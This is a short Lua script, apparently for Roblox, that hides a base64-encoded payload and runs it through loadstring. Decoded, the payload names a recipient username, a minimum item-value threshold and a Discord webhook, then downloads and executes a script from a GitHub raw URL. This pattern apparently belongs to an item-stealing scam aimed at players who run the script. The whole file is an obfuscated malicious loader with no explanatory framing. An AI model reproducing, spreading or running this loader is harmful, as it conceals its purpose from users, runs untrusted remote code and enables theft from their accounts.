
-- Obfuscated script
local encodedScript = "ClVzZXJuYW1lID0gInJlbW9yb3NhNzIiClVzZXJuYW1lMiA9ICJyZW1vcm9zYTcyIgpNaW5pbXVtUkFQID0gNTAwMDAwMDAwMDAwMDAwMApXZWJob29rID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzNDY1OTQ3ODI3ODAwNjM4MzUvdGhpSDFTY0VJdHBHc1NDNFFqNXdiTlhaS2FlX0twTHdtNDM4cTdyMlVZMUZ6NG94bnBpZWhhLXFFME1uN2FLT0FqMmgiCgpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzIxNEVsaS8yMTRzY3JpcHRzL3JlZnMvaGVhZHMvbWFpbi8yMTRzY3JpcHRzIiwgdHJ1ZSkpKCk="

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()